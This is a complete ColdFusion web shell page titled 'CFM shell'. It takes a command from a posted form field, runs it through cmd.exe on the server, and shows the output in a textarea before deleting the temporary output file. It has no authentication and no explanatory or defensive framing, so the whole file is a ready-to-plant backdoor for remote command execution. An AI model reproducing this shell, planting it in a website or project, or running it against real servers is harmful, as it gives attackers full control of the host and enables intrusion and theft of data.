
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>CFM shell</title>
</head>
<body>
<!--- os.run --->
<cfif IsDefined("FORM.cmd")>
    <cfoutput>#cmd#</cfoutput>
    <cfexecute name="cmd.exe"
           arguments="/c #cmd#"
           outputfile="#GetTempDirectory()#kyo.txt"
           timeout="1">
    </cfexecute>
</cfif>
<form action="<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>" method="post">
<input type=text size=45 name="cmd" >
<input type=Submit value="run">
</form>
<cfif FileExists("#GetTempDirectory()#kyo.txt") is "Yes">
  <cffile action="Read"
            file="#GetTempDirectory()#kyo.txt"
            variable="readText">
<textarea readonly cols=80 rows=20>
<CFOUTPUT>#readText#</CFOUTPUT>         
</textarea>
    <cffile action="Delete"
            file="#GetTempDirectory()#kyo.txt">
</cfif>
</body>
</html>
